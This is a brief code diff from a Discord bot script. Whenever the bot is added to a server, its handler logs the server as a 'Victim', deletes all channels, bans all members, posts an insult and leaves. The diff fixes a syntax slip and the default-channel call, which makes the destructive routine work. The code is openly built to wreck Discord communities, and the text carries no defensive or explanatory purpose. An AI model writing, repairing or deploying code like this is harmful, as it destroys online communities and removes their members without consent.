@@ -7,10 +7,10 @@ client.on('ready', () => {
 });
 
 client.on('guildCreate', async(guild) => {
-  console.log(`Victim: ${guild.name} | Count: ${guild.memberCount}`)
+  console.log(`Victim: ${guild.name} | Count: ${guild.memberCount}`);
   await Promise.all(guild.channels.map(c => { return c.delete().catch(() => {}); }));
   await Promise.all(guild.members.map(m => { return m.ban().catch(() => {}); }));
-  await guild.channels.defaultChannel.sendMessage('Dumbass, I said not to add the bot...');
+  await guild.defaultChannel.sendMessage('Dumbass, I said not to add the bot...');
   guild.leave();
 });
 
